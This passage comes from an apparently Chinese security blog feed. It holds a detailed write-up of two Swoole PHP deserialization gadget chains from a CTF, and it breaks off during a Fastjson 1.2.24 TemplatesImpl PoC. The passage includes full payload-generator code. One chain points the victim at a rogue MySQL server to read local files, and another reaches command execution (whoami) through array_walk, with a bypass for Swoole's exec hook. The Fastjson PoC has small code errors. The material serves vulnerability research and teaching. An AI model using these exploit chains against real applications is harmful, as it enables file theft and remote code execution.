<h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>对于Commons Collections&lt;=3.2.1：</p>
<p>可用的链为1,3,5,6,7。</p>
<p>对于Commons Collections 4.0：</p>
<p>可用的链为2,4。</p>
<p>大多数链的触发流程其实还是差不多了，无非是换了一些触发点和最后的一些恶意代码触发方法，同样，也可以自己试试挖掘下新的CommonCollections的gadget。</p>
]]></content>
  </entry>
  <entry>
    <title>Swoole deserialization Gadgets</title>
    <url>/2020/09/09/Swoole-deserialization-Gadgets/</url>
    <content><![CDATA[<h3 id="First-Gadgets–Rouge-MySQL-Server"><a href="#First-Gadgets–Rouge-MySQL-Server" class="headerlink" title="First Gadgets–Rouge MySQL Server"></a>First Gadgets–Rouge MySQL Server</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeProperty</span> <span class="params">($object, $property, $value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $a = <span class="keyword">new</span> ReflectionClass($object);</span><br><span class="line">    $b = $a-&gt;getProperty($property);</span><br><span class="line">    $b-&gt;setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    $b-&gt;setValue($object, $value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Part A</span></span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> \Swoole\Database\PDOConfig();</span><br><span class="line">$c-&gt;withHost(<span class="string">'ROUGE_MYSQL_SERVER'</span>);    <span class="comment">// your rouge-mysql-server host &amp; port</span></span><br><span class="line">$c-&gt;withPort(<span class="number">3306</span>);</span><br><span class="line">$c-&gt;withOptions([</span><br><span class="line">    \PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="number">1</span>,</span><br><span class="line">    \PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'select 1'</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> \Swoole\ConnectionPool(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; &#125;, <span class="number">0</span>, <span class="string">'\\Swoole\\Database\\PDOPool'</span>);</span><br><span class="line">changeProperty($a, <span class="string">'size'</span>, <span class="number">100</span>);</span><br><span class="line">changeProperty($a, <span class="string">'constructor'</span>, $c);</span><br><span class="line">changeProperty($a, <span class="string">'num'</span>, <span class="number">0</span>);</span><br><span class="line">changeProperty($a, <span class="string">'pool'</span>, <span class="keyword">new</span> \SplDoublyLinkedList());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Part C</span></span><br><span class="line"></span><br><span class="line">$d = unserialize(base64_decode(<span class="string">'TzoyNDoiU3dvb2xlXERhdGFiYXNlXFBET1Byb3h5Ijo0OntzOjExOiIAKgBfX29iamVjdCI7TjtzOjIyOiIAKgBzZXRBdHRyaWJ1dGVDb250ZXh0IjtOO3M6MTQ6IgAqAGNvbnN0cnVjdG9yIjtOO3M6ODoiACoAcm91bmQiO2k6MDt9'</span>));</span><br><span class="line"><span class="comment">// This's Swoole\Database\MysqliProxy</span></span><br><span class="line">changeProperty($d, <span class="string">'constructor'</span>, [$a, <span class="string">'get'</span>]);</span><br><span class="line"></span><br><span class="line">$curl = <span class="keyword">new</span> \Swoole\Curl\Handler(<span class="string">'http://www.baidu.com'</span>);</span><br><span class="line">$curl-&gt;setOpt(CURLOPT_HEADERFUNCTION, [$d, <span class="string">'reconnect'</span>]);</span><br><span class="line">$curl-&gt;setOpt(CURLOPT_READFUNCTION, [$d, <span class="string">'get'</span>]);</span><br><span class="line"></span><br><span class="line">$ret = <span class="keyword">new</span> \Swoole\ObjectProxy(<span class="keyword">new</span> stdClass);</span><br><span class="line">changeProperty($ret, <span class="string">'__object'</span>, [$curl, <span class="string">'exec'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$s = serialize($ret);</span><br><span class="line">$s = preg_replace_callback(<span class="string">'/s:(\d+):"\x00(.*?)\x00/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'s:'</span> . ((int)$a[<span class="number">1</span>] - strlen($a[<span class="number">2</span>]) - <span class="number">2</span>) . <span class="string">':"'</span>;</span><br><span class="line">&#125;, $s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><p><a href="https://github.com/swoole/library/issues/34" target="_blank" rel="noopener">Hint</a></p>
<p>根据上面的提示大概可以猜测出是通过Rogue MySQL Server来读取文件，但是在旧版本中mysql的连接与参数配置顺序是颠倒的</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wQN7sU.png" alt="wQN7sU.png"></p>
<p>可以看到在左面旧版本中是进行先数据库连接，再进行数据库选项配置。</p>
<p>并且在新版本中进行了更新，修复了Bug。</p>
<p>而Gadgets的挖掘是以旧版本为基础的，所以无法通过mysqli的连接方式配合恶意mysql进行文件读取，但是还有PDO连接可以用，通过可以实现相同的效果。下面就是调用链的分析了</p>
<p>ObjectProxy.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * This file is part of Swoole.</span><br><span class="line"> *</span><br><span class="line"> * @link     https:&#x2F;&#x2F;www.swoole.com</span><br><span class="line"> * @contact  team@swoole.com</span><br><span class="line"> * @license  https:&#x2F;&#x2F;github.com&#x2F;swoole&#x2F;library&#x2F;blob&#x2F;master&#x2F;LICENSE</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">declare(strict_types&#x3D;1);</span><br><span class="line"></span><br><span class="line">namespace Swoole;</span><br><span class="line"></span><br><span class="line">use TypeError;</span><br><span class="line"></span><br><span class="line">class ObjectProxy</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;** @var object *&#x2F;</span><br><span class="line">    protected $__object;</span><br><span class="line"></span><br><span class="line">    public function __construct($object)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!is_object($object)) &#123;</span><br><span class="line">            throw new TypeError(&#39;Non-object given&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;__object &#x3D; $object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __invoke(...$arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;** @var mixed $object *&#x2F;</span><br><span class="line">        $object &#x3D; $this-&gt;__object;</span><br><span class="line">        return $object(...$arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终触发$object(…$arguments);的调用，而如果$object的赋值为[new A,’foo’]这样是可以调用A类的foo方法的，具体的demo如下</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wQgXu9.png" alt="wQgXu9.png"></p>
<p>所以现在可以进行调用任意类的无参方法了，在这个Gadget中选取的Handler的exec方法</p>
<p>Handler#exec</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isAvailable()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进execute函数(关键部分)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($client-&gt;headers) &#123;</span><br><span class="line">    $cb = <span class="keyword">$this</span>-&gt;headerFunction;</span><br><span class="line">    <span class="keyword">if</span> ($client-&gt;statusCode &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $row = <span class="string">"HTTP/1.1 &#123;$client-&gt;statusCode&#125; "</span> . Status::getReasonPhrase($client-&gt;statusCode) . <span class="string">"\r\n"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($cb) &#123;</span><br><span class="line">            $cb(<span class="keyword">$this</span>, $row);</span><br><span class="line">        &#125;</span><br><span class="line">        $headerContent .= $row;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($client-&gt;headers <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $row = <span class="string">"&#123;$k&#125;: &#123;$v&#125;\r\n"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($cb) &#123;</span><br><span class="line">            $cb(<span class="keyword">$this</span>, $row);</span><br><span class="line">        &#125;</span><br><span class="line">        $headerContent .= $row;</span><br><span class="line">    &#125;</span><br><span class="line">    $headerContent .= <span class="string">"\r\n"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;info[<span class="string">'header_size'</span>] = strlen($headerContent);</span><br><span class="line">    <span class="keyword">if</span> ($cb) &#123;</span><br><span class="line">        $cb(<span class="keyword">$this</span>, <span class="string">''</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;info[<span class="string">'header_size'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($client-&gt;body <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;readFunction) &#123;</span><br><span class="line">    $cb = <span class="keyword">$this</span>-&gt;readFunction;</span><br><span class="line">    $cb(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;outputStream, strlen($client-&gt;body));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到两个关键部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cb = <span class="keyword">$this</span>-&gt;headerFunction;</span><br><span class="line">$cb(<span class="keyword">$this</span>, $row);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cb = <span class="keyword">$this</span>-&gt;readFunction;</span><br><span class="line">$cb(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;outputStream, strlen($client-&gt;body));</span><br></pre></td></tr></table></figure>

<p>将第一个$cb设置为MysqliProxy#reconnect</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reconnect</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $constructor = <span class="keyword">$this</span>-&gt;constructor;</span><br><span class="line">    <span class="keyword">parent</span>::__construct($constructor());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;round++;</span><br><span class="line">    <span class="comment">/* restore context */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;charsetContext) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__object-&gt;set_charset(<span class="keyword">$this</span>-&gt;charsetContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;setOptContext) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;setOptContext <span class="keyword">as</span> $opt =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__object-&gt;set_opt($opt, $val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;changeUserContext) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__object-&gt;change_user(...<span class="keyword">$this</span>-&gt;changeUserContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将$constructor设置为ConnectionPool#get</p>
<p>跟进get函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;pool === <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'Pool has been closed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;pool-&gt;isEmpty() &amp;&amp; <span class="keyword">$this</span>-&gt;num &lt; <span class="keyword">$this</span>-&gt;size) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;make();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在满足一定条件的情况下进入make函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;num++;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;proxy) &#123;</span><br><span class="line">            $connection = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;proxy(<span class="keyword">$this</span>-&gt;constructor);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $constructor = <span class="keyword">$this</span>-&gt;constructor;</span><br><span class="line">            $connection = $constructor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable $throwable) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;num--;</span><br><span class="line">        <span class="keyword">throw</span> $throwable;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;put($connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从以上代码可以看出make函数可以实例化任意类，所以我们可以将proxy设置为PDOPool，将constructor变量设置为PDOConfig，从而得到一个完整的PDO实例。接着跟进put函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span><span class="params">($connection)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;pool === <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($connection !== <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool-&gt;push($connection);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* connection broken */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;num -= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;make();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在put函数中通过push将已经实例化好的类压入栈中，跟完make函数后，紧接着到下面的pop函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;pop();</span><br></pre></td></tr></table></figure>

<p>将刚压入栈中的实例化PDOPool类弹出并返回作为父类的构造函数的参数传给__object变量</p>
<p>参数设置部分代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeProperty</span> <span class="params">($object, $property, $value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $a = <span class="keyword">new</span> ReflectionClass($object);</span><br><span class="line">    $b = $a-&gt;getProperty($property);</span><br><span class="line">    $b-&gt;setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    $b-&gt;setValue($object, $value);</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> \Swoole\Database\PDOConfig();</span><br><span class="line">$c-&gt;withHost(<span class="string">'ROUGE_MYSQL_SERVER'</span>);    <span class="comment">// your rouge-mysql-server host &amp; port</span></span><br><span class="line">$c-&gt;withPort(<span class="number">3306</span>);</span><br><span class="line">$c-&gt;withOptions([</span><br><span class="line">    \PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="number">1</span>,</span><br><span class="line">    \PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'select 1'</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">$a = <span class="keyword">new</span> \Swoole\ConnectionPool(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; &#125;, <span class="number">0</span>, <span class="string">'\\Swoole\\Database\\PDOPool'</span>);</span><br><span class="line">changeProperty($a, <span class="string">'size'</span>, <span class="number">100</span>);</span><br><span class="line">changeProperty($a, <span class="string">'constructor'</span>, $c);</span><br><span class="line">changeProperty($a, <span class="string">'num'</span>, <span class="number">0</span>);</span><br><span class="line">changeProperty($a, <span class="string">'pool'</span>, <span class="keyword">new</span> \SplDoublyLinkedList());</span><br></pre></td></tr></table></figure>

<p>跟进父类__construct的构造函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectProxy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> object */</span></span><br><span class="line">    <span class="keyword">protected</span> $__object;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($object)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_object($object)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TypeError(<span class="string">'Non-object given'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__object = $object;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>此时ObjectProxy类的__object变量即为我们的PDOPool类</p>
<p>不过还需要注意的是ConnectionPool类中的Pool变量为Channel类，在此版本已经移除了其序列化，所以我们需要fuzz下同时支持isEmpty/pop/Empty三种方法的内部类，fuzz结果如下：</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wlcNH1.png" alt="wlcNH1.png"></p>
<p>从上面选取一个类使用即可。</p>
<p>接着看第二个$cb的利用，设置Handler类readFunction为MysqliProxy中的get方法</p>
<p>在触发get方法的时候，由于MysqliProxy并不存在这个方法，所以触发__call方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">(string $name, array $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> ($n = <span class="number">3</span>; $n--;) &#123;</span><br><span class="line">            $ret = @<span class="keyword">$this</span>-&gt;__object-&gt;&#123;$name&#125;(...$arguments);</span><br><span class="line">            <span class="keyword">if</span> ($ret === <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="comment">/* non-IO method */</span></span><br><span class="line">.....</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* <span class="doctag">@noinspection</span> PhpUndefinedVariableInspection */</span></span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>由于MysqliProxy为ObjectProxy类的子类，所以这里实际触发的是PDOPool-&gt;get方法，最终完成PDO数据库连接，触发恶意mysql服务器完成数据读取，这里PDOPool类中的Pool变量并不用管，与ConnectPool类不同的是Pool变量是在反序列化的过程生成的，不会存在反序列化数据中。</p>
<h4 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h4><p>1.利用反射进行属性修改</p>
<p>2.寻找pop链的时候，注意父类与子类的联系，子类可以用父类的属性，比如在此pop链中MysqliProxy可以用父类ObjectProxy中_object的属性值。</p>
<h3 id="Second-Gadgets–RCE"><a href="#Second-Gadgets–RCE" class="headerlink" title="Second Gadgets–RCE"></a>Second Gadgets–RCE</h3><h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$o = <span class="keyword">new</span> Swoole\Curl\Handlep(<span class="string">"http://google.com/"</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_READFUNCTION,<span class="string">"array_walk"</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_FILE, <span class="string">"array_walk"</span>);</span><br><span class="line">$o-&gt;exec = <span class="keyword">array</span>(<span class="string">'whoami'</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_POST,<span class="number">1</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_POSTFIELDS,<span class="string">"aaa"</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_HTTPHEADER,[<span class="string">"Content-type"</span>=&gt;<span class="string">"application/json"</span>]);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);</span><br><span class="line"></span><br><span class="line">$a = serialize([$o,<span class="string">'exec'</span>]);</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">"Handlep"</span>,<span class="string">"Handler"</span>,urlencode(process_serialized($a)));</span><br></pre></td></tr></table></figure>



<h4 id="Analyisis"><a href="#Analyisis" class="headerlink" title="Analyisis"></a>Analyisis</h4><p>主要是从寻找任意类的无参函数的调用开始有所区别</p>
<p>这RCE这条链中主要是对于这种形式如 Func($this,$var,$num)的fuzz。</p>
<p>大概如下</p>
<p><img src="https://s1.ax1x.com/2020/09/09/w1RTOg.png" alt="w1RTOg.png"></p>
<p>​    这里主要用到的是array_walk对Object的一些触发，具体demo如下：</p>
<p><img src="https://s1.ax1x.com/2020/09/09/w1o3NQ.png" alt="w1o3NQ.png"></p>
<p>所以正常情况下我们只需要设置下exec就可以完成命令执行了</p>
<p>但是在swoole中的exec调用并不是真正的exec，实际上调用的是hook后的swoole_exec</p>
<p><a href="https://github.com/swoole/swoole-src/blob/f1a66611d8779114afbb0638d18c528689194ac8/swoole_runtime.cc#L1270" target="_blank" rel="noopener">https://github.com/swoole/swoole-src/blob/f1a66611d8779114afbb0638d18c528689194ac8/swoole_runtime.cc#L1270</a></p>
<p>在发生错误时会直接产生Fatal Error，终止运行。</p>
<p>可以通过如下方法来bypass</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_walk($this, array_walk, 1);</span><br><span class="line">$this-&gt;exec&#x3D;array(&quot;id&quot;)</span><br><span class="line"></span><br><span class="line">调用&#x3D;&gt;</span><br><span class="line"></span><br><span class="line">array_walk($client_value,&quot;client&quot;,1)&#x3D;&gt;callback not found &#x3D;&gt; warning</span><br><span class="line"></span><br><span class="line">array_walk(array(&quot;id&quot;),&quot;exec&quot;,1)&#x3D;&gt; finish RCE</span><br></pre></td></tr></table></figure>

<h4 id="Conclusion-1"><a href="#Conclusion-1" class="headerlink" title="Conclusion"></a>Conclusion</h4><p>1.array_walk也可以遍历对象来进行函数调用</p>
<p>2.二次array_walk bypass swoole_exec</p>
<h3 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h3><p><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2020/swoole" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2020/swoole</a></p>
<p><a href="https://blog.sometimenaive.com/2020/06/04/rctf-2020-swoole-writeup/" target="_blank" rel="noopener">https://blog.sometimenaive.com/2020/06/04/rctf-2020-swoole-writeup/</a></p>
]]></content>
      <tags>
        <tag>Swoole</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson分析系列--1.2.22-1.2.24反序列化漏洞分析</title>
    <url>/2020/09/24/Fastjson%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-1-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文为Fastjson1.2.22-1.2.24反序列化漏洞分析。</p>
<p>主要利用链分为基于TemplateImpl的利用链和基于JdbcRowSetImpl的利用链</p>
<a id="more"></a>

<h3 id="TemplateImpl利用链"><a href="#TemplateImpl利用链" class="headerlink" title="TemplateImpl利用链"></a>TemplateImpl利用链</h3><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_auto</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = <span class="string">"/Users/lih3iu/Test.class"</span>;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],"</span> +</span><br><span class="line">                <span class="string">"'_name':'a.b',"</span> +</span><br><span class="line">                <span class="string">"'_tfactory':&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_outputProperties\":&#123; &#125;&#125;\n"</span>;</span><br><span class="line">        System.out.println(text);</span><br><span class="line">        Object obj = JSON.parseObject(text1, Object<span class="class">.<span class="keyword">class</span>, <span class="title">config</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h4><p>断点下在JSON.parseObject并跟进</p>
<p>JSON#praseObject</p>
